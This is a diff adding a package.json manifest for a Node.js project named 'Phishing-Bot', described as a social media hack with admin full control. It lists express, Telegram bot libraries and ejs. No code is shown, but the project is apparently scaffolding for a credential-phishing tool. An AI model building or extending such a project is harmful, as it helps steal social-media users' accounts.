@@ -1,0 +1,16 @@
+{
+  "name": "Phishing-Bot",
+  "version": "1.0.0",
+  "description": "Social media hack with admin full control",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js"
+  },
+  "dependencies": {
+    "express": "*",
+    "body-parser": "*",
+    "telegraf": "*",
+    "node-telegram-bot-api": "*",
+    "ejs": "*"
+  }
+}
